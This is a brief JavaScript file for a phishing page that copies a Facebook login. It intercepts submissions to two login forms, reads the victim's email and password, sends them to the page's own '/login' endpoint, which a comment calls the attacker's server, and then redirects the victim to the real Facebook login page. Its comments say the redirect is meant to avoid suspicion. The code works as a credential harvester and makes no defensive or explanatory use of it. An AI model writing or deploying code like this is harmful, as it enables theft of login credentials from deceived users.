document.addEventListener('DOMContentLoaded', () => {
    const loginFormHeader = document.getElementById('loginForm');
    const loginFormMain = document.getElementById('loginFormMain');

    if (loginFormHeader) {
        loginFormHeader.addEventListener('submit', handleLoginSubmit);
    }

    if (loginFormMain) {
        loginFormMain.addEventListener('submit', handleLoginSubmit);
    }

    function handleLoginSubmit(event) {
        event.preventDefault(); // Prevent default form submission

        const form = event.target;
        const emailInput = form.querySelector('input[name="email"]');
        const passwordInput = form.querySelector('input[name="password"]');

        const email = emailInput.value;
        const password = passwordInput.value;

        console.log('Attempting to send credentials:', { email, password });

        // Send credentials to the attacker's server
        fetch('/login', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({ email, password }),
        })
        .then(response => {
            console.log('Server response received:', response);
            if (response.ok) {
                return response.text();
            }
            throw new Error('Network response was not ok.');
        })
        .then(data => {
            console.log('Credentials sent successfully:', data);
            // Redirect to a legitimate Facebook page or a fake error page
            window.location.href = 'https://www.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=110';
        })
        .catch(error => {
            console.error('Error sending credentials:', error);
            // Even if there's an error, redirect to avoid suspicion
            window.location.href = 'https://www.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=110';
        });
    }
});
